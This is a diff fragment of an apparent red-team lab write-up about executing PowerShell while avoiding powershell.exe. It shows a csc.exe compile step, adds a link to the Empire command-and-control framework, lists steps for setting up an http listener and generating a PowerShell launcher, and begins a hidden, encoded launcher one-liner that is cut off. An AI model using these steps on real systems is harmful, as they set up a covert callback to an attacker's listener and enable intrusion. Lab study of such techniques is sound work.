@@ -88,12 +88,14 @@ The goal of this lab is to execute a Powershell script and avoid to use the powe
 csc.exe /reference:"C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\3.0\System.Management.Automation.dll" 1.cs
 ```
 ##### get a listener going and generate our shellcode. 
+https://github.com/BC-SECURITY/Empire   
 Empire, run
 - ./empire
 - listeners
 - uselistener http
 - Configure your listener
 - launcher powershell
+
 ##### We now have a PowerShell one-liner we can use to launch our payload.
 ```powershell
 powershell -noP -sta -w 1 -enc
